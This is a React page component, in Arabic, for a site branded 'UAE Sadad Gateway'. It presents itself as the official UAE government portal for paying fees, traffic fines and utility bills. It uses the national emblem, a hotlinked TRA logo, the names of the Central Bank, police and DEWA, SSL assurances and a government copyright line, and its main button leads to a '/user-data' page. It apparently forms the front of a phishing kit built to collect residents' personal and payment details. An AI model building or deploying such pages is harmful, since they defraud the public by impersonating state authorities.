import { Button } from "@/components/ui/button";
import { useLocation } from "wouter";
import { ShieldCheck, Lock, Globe, PhoneCall } from "lucide-react";

export default function Home() {
  const [, setLocation] = useLocation();

  return (
    <div className="min-h-screen flex flex-col bg-white font-sans text-right" dir="rtl">
      {/* Top Bar */}
      <div className="bg-gray-100 py-1 border-b border-gray-200">
        <div className="container flex justify-between items-center text-[10px] md:text-xs text-gray-600">
          <div className="flex gap-4">
            <span className="flex items-center gap-1"><Globe className="w-3 h-3" /> الموقع الرسمي لحكومة دولة الإمارات</span>
          </div>
          <div className="flex gap-4">
            <a href="#" className="hover:text-amber-600">English</a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:text-amber-600">تسجيل الدخول</a>
          </div>
        </div>
      </div>

      {/* Main Header */}
      <header className="bg-white py-4 shadow-md sticky top-0 z-50">
        <div className="container flex justify-between items-center">
          <div className="flex items-center gap-4">
            <div className="flex flex-col border-r-2 border-amber-500 pr-4">
              <h1 className="text-xl md:text-2xl font-black text-gray-900 tracking-tighter">سداد الإمارات</h1>
              <p className="text-[10px] md:text-xs text-amber-600 font-bold uppercase tracking-widest">UAE SADAD GATEWAY</p>
            </div>
          </div>
          <nav className="hidden lg:flex gap-8 text-sm font-bold text-gray-700">
            <a href="#" className="hover:text-amber-500 transition-colors">الرئيسية</a>
            <a href="#" className="hover:text-amber-500 transition-colors">الخدمات الإلكترونية</a>
            <a href="#" className="hover:text-amber-500 transition-colors">عن البوابة</a>
            <a href="#" className="hover:text-amber-500 transition-colors">مركز المساعدة</a>
          </nav>
          <div className="flex items-center gap-2">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" alt="UAE Emblem" className="h-12 w-auto" />
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <main className="flex-grow">
        <section className="relative bg-slate-900 py-20 md:py-32 overflow-hidden">
          <div className="absolute inset-0 opacity-30">
            <img src="https://images.unsplash.com/photo-1512453979798-5ea266f8880c?auto=format&fit=crop&q=80&w=2000" alt="Dubai Skyline" className="w-full h-full object-cover" />
          </div>
          <div className="absolute inset-0 bg-gradient-to-l from-slate-900 via-slate-900/80 to-transparent"></div>
          
          <div className="relative container grid md:grid-cols-2 gap-12 items-center">
            <div className="text-white space-y-6">
              <div className="inline-flex items-center gap-2 bg-amber-500/20 border border-amber-500/30 px-4 py-1 rounded-full text-amber-400 text-sm font-bold">
                <ShieldCheck className="w-4 h-4" /> نظام سداد الموحد المعتمد
              </div>
              <h2 className="text-4xl md:text-6xl font-black leading-tight">
                بوابة السداد الرقمية <br />
                <span className="text-amber-500">لدولة الإمارات</span>
              </h2>
              <p className="text-lg text-gray-300 max-w-lg leading-relaxed">
                المنصة الرسمية الموحدة لسداد كافة الرسوم الحكومية، المخالفات المرورية، وفواتير الخدمات العامة والخاصة عبر قنوات دفع آمنة ومشفرة.
              </p>
              <div className="flex flex-wrap gap-4 pt-4">
                <Button 
                  onClick={() => setLocation("/user-data")}
                  className="bg-amber-500 hover:bg-amber-600 text-white text-xl py-8 px-12 rounded-lg shadow-2xl shadow-amber-500/20 transition-all transform hover:-translate-y-1 font-bold"
                >
                  ابدأ الخدمة الآن
                </Button>
                <Button variant="outline" className="bg-white/10 border-white/20 text-white hover:bg-white/20 py-8 px-8 rounded-lg font-bold">
                  دليل المستخدم
                </Button>
              </div>
            </div>

            <div className="hidden md:block">
              <div className="bg-white/5 backdrop-blur-md border border-white/10 p-8 rounded-3xl shadow-2xl">
                <div className="space-y-6">
                  <div className="flex items-center gap-4 border-b border-white/10 pb-4">
                    <div className="w-12 h-12 bg-amber-500 rounded-full flex items-center justify-center text-white font-bold text-xl">1</div>
                    <div>
                      <h4 className="text-white font-bold">سهولة الوصول</h4>
                      <p className="text-gray-400 text-xs">سدد فواتيرك في أقل من دقيقتين</p>
                    </div>
                  </div>
                  <div className="flex items-center gap-4 border-b border-white/10 pb-4">
                    <div className="w-12 h-12 bg-blue-500 rounded-full flex items-center justify-center text-white font-bold text-xl">2</div>
                    <div>
                      <h4 className="text-white font-bold">أمان مطلق</h4>
                      <p className="text-gray-400 text-xs">تشفير بيانات بنكي متطور</p>
                    </div>
                  </div>
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 bg-green-500 rounded-full flex items-center justify-center text-white font-bold text-xl">3</div>
                    <div>
                      <h4 className="text-white font-bold">اعتماد فوري</h4>
                      <p className="text-gray-400 text-xs">تحديث فوري لحالة السداد لدى الجهات</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* Trust Indicators */}
        <section className="py-12 bg-gray-50 border-b border-gray-200">
          <div className="container flex flex-wrap justify-center items-center gap-8 md:gap-20 opacity-60 grayscale hover:grayscale-0 transition-all">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" alt="Gov" className="h-12" />
             <div className="text-2xl font-bold text-gray-400">TRA</div>
             <div className="text-2xl font-bold text-gray-400">CENTRAL BANK</div>
             <div className="text-2xl font-bold text-gray-400">AD POLICE</div>
             <div className="text-2xl font-bold text-gray-400">DEWA</div>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer className="bg-slate-900 text-gray-400 py-16 border-t-4 border-amber-500">
        <div className="container grid md:grid-cols-4 gap-12">
          <div className="space-y-4">
            <h3 className="text-white font-bold text-xl">سداد الإمارات</h3>
            <p className="text-sm leading-relaxed">
              البوابة الوطنية الموحدة للمدفوعات الرقمية في دولة الإمارات العربية المتحدة. تهدف المنصة إلى تعزيز التحول الرقمي وتسهيل المعاملات المالية للمواطنين والمقيمين.
            </p>
            <div className="flex gap-4 pt-2">
              <div className="w-8 h-8 bg-white/10 rounded-full flex items-center justify-center hover:bg-amber-500 hover:text-white transition-all cursor-pointer">f</div>
              <div className="w-8 h-8 bg-white/10 rounded-full flex items-center justify-center hover:bg-amber-500 hover:text-white transition-all cursor-pointer">t</div>
              <div className="w-8 h-8 bg-white/10 rounded-full flex items-center justify-center hover:bg-amber-500 hover:text-white transition-all cursor-pointer">i</div>
            </div>
          </div>
          
          <div>
            <h4 className="text-white font-bold mb-6">روابط سريعة</h4>
            <ul className="space-y-3 text-sm">
              <li><a href="#" className="hover:text-amber-500 transition-colors">الخدمات الحكومية</a></li>
              <li><a href="#" className="hover:text-amber-500 transition-colors">سداد المخالفات</a></li>
              <li><a href="#" className="hover:text-amber-500 transition-colors">فواتير المرافق</a></li>
              <li><a href="#" className="hover:text-amber-500 transition-colors">الأسئلة الشائعة</a></li>
            </ul>
          </div>

          <div>
            <h4 className="text-white font-bold mb-6">المساعدة والدعم</h4>
            <ul className="space-y-3 text-sm">
              <li><a href="#" className="hover:text-amber-500 transition-colors">مركز الاتصال: 800-SADAD</a></li>
              <li><a href="#" className="hover:text-amber-500 transition-colors">تواصل معنا</a></li>
              <li><a href="#" className="hover:text-amber-500 transition-colors">خريطة الموقع</a></li>
              <li><a href="#" className="hover:text-amber-500 transition-colors">سياسة الخصوصية</a></li>
            </ul>
          </div>

          <div className="space-y-6">
            <div className="bg-white/5 p-4 rounded-xl border border-white/10">
              <div className="flex items-center gap-3 mb-2">
                <Lock className="w-5 h-5 text-amber-500" />
                <span className="text-white font-bold text-sm">اتصال آمن</span>
              </div>
              <p className="text-[10px]">هذا الموقع محمي بشهادة SSL عالمية لضمان سرية بياناتك المالية.</p>
            </div>
            <div className="flex items-center gap-4">
               <img src="https://www.tra.gov.ae/assets/images/logo.png" alt="TRA" className="h-8 opacity-50" />
            </div>
          </div>
        </div>
        <div className="container border-t border-white/5 mt-12 pt-8 text-center text-xs">
          <p>© 2024 حكومة دولة الإمارات العربية المتحدة - جميع الحقوق محفوظة</p>
        </div>
      </footer>
    </div>
  );
}
